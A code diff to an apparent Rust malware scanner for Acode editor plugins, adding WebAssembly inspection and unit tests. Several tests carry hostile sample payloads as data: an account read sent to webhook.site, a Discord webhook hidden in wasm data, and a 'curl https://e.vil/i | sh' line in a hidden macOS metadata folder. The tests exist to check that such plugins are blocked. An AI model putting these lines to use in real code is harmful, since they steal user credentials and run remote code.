@@ -6,6 +6,7 @@ use crate::{
     report::{Capability, Endpoint, Finding, Recommendation, Report},
     rules::{self, RuleContext},
     severity::{Category, Confidence, Severity},
+    wasm,
 };
 
 /// Files above this are not parsed; real plugin bundles are far smaller.
@@ -37,6 +38,7 @@ pub fn scan_archive(archive: &PluginArchive, options: ScanOptions, report: &mut 
 
     let mut reads_sensitive = Vec::new();
     let mut url_sources: Vec<(String, String)> = Vec::new();
+    let mut embedded_wasm: Vec<(String, Vec<u8>)> = Vec::new();
 
     for file in archive.javascript_files() {
         if options.entry_only && entry.as_deref() != Some(file.path.as_str()) {
@@ -104,6 +106,7 @@ pub fn scan_archive(archive: &PluginArchive, options: ScanOptions, report: &mut 
         };
 
         let mut ctx = RuleContext::new(&name, &source, plugin_id.as_deref());
+        ctx.entry = entry.as_deref();
         let outcome = js::analyze(&mut ctx);
         report.stats.js_files_parsed += 1;
         report.stats.js_bytes_parsed += source.len() as u64;
@@ -133,8 +136,24 @@ pub fn scan_archive(archive: &PluginArchive, options: ScanOptions, report: &mut 
             reads_sensitive.push(name.clone());
         }
         url_sources.extend(facts.urls.into_iter().map(|url| (name.clone(), url)));
+        embedded_wasm.extend(
+            facts
+                .embedded_wasm
+                .into_iter()
+                .enumerate()
+                .map(|(index, bytes)| (format!("{name} (embedded wasm #{})", index + 1), bytes)),
+        );
         report.findings.extend(ctx.findings);
         report.sources.insert(name, source);
+    }
+
+    if !options.entry_only {
+        for file in archive.wasm_files() {
+            wasm::analyze(&file.path, &file.bytes, false, report, &mut url_sources);
+        }
+    }
+    for (name, bytes) in &embedded_wasm {
+        wasm::analyze(name, bytes, true, report, &mut url_sources);
     }
 
     analyse_endpoints(report, &url_sources);
@@ -501,6 +520,104 @@ mod tests {
         .unwrap();
         assert_eq!(report.stats.js_files_parsed, 1);
         assert!(!report.has("dynamic.decoded_exec"));
+    }
+
+    #[test]
+    fn ordinary_wasm_plugin_passes() {
+        let module = crate::wasm::tests::module(
+            &[("env", "memory_grow"), ("wbg", "__wbg_log_77aa01")],
+            b"tree-sitter grammar tables",
+        );
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                b"acode.setPluginInit('com.example.p', async (baseUrl) => { await WebAssembly.instantiateStreaming(fetch(baseUrl + 'parser.wasm'), {}) })",
+            ),
+            ("parser.wasm", &module),
+        ]);
+        assert_eq!(
+            report.verdict.recommendation,
+            Recommendation::Pass,
+            "{:#?}",
+            report.findings
+        );
+        assert!(report.has("wasm.module"));
+    }
+
+    #[test]
+    fn webhook_hidden_in_wasm_data_is_exfiltration() {
+        let module = crate::wasm::tests::module(
+            &[("env", "send")],
+            b"\0https://discord.com/api/webhooks/1/abc\0",
+        );
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                b"const fs = acode.require('fs'); acode.setPluginInit('com.example.p', async () => { await fs(DATA_STORAGE).lsDir(); })",
+            ),
+            ("lib.wasm", &module),
+        ]);
+        assert!(
+            report.has("correlation.exfiltration"),
+            "{:#?}",
+            report.findings
+        );
+        assert_eq!(report.verdict.recommendation, Recommendation::Block);
+    }
+
+    #[test]
+    fn base64_wasm_in_javascript_is_unpacked() {
+        use base64::Engine;
+        let module = crate::wasm::tests::module(&[("env", "emscripten_run_script")], b"");
+        let inline = base64::engine::general_purpose::STANDARD.encode(module);
+        let source = format!(
+            "const bytes = Uint8Array.from(atob('{inline}'), c => c.charCodeAt(0)); WebAssembly.instantiate(bytes, {{}});"
+        );
+        let report = scan(&[MANIFEST, ICON, README, ("main.js", source.as_bytes())]);
+        assert!(report.has("wasm.embedded_module"));
+        assert!(report.has("wasm.eval_import"), "{:#?}", report.findings);
+        assert_eq!(report.verdict.recommendation, Recommendation::Review);
+    }
+
+    #[test]
+    fn account_read_sent_to_webhook_is_blocked() {
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                br#"acode.setPluginInit('com.example.p', async () => {
+                  const me = await (await fetch('https://acode.app/api/login')).json();
+                  fetch('https://webhook.site/x', { method: 'POST', body: JSON.stringify(me) });
+                });"#,
+            ),
+        ]);
+        assert!(report.has("network.acode_account_read"));
+        assert_eq!(report.verdict.recommendation, Recommendation::Block);
+    }
+
+    #[test]
+    fn payload_in_macos_metadata_folder_is_scanned() {
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                b"const s = document.createElement('script'); s.src = '__MACOSX/x.js'; document.head.append(s)",
+            ),
+            ("__MACOSX/x.js", b"Executor.execute('curl https://e.vil/i | sh')"),
+        ]);
+        assert!(report.has("archive.metadata_path_content"));
+        assert!(report.has("shell.dangerous_command"));
+        assert_eq!(report.verdict.recommendation, Recommendation::Block);
     }
 
     #[test]
